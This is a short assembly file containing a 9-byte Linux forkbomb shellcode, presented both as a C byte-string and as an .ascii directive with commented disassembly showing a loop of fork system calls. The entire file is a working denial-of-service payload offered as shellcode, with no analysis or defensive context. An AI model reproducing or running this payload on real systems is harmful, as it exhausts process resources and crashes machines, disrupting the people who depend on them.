# /* Basic forkbomb (both x86 and x64 compatible) - Length: 9 bytes */
# char shellcode[] = "\x6a\x02\x5b\x53\x58\xcd\x80\xeb\xfa";

.text
.globl _start
_start:
	.ascii "\x6a\x02\x5b\x53\x58\xcd\x80\xeb\xfa"

#	push   $0x2
#	pop    %ebx
#loop:
#	push   %ebx
#	pop    %eax
#	int    $0x80
#	jmp    loop
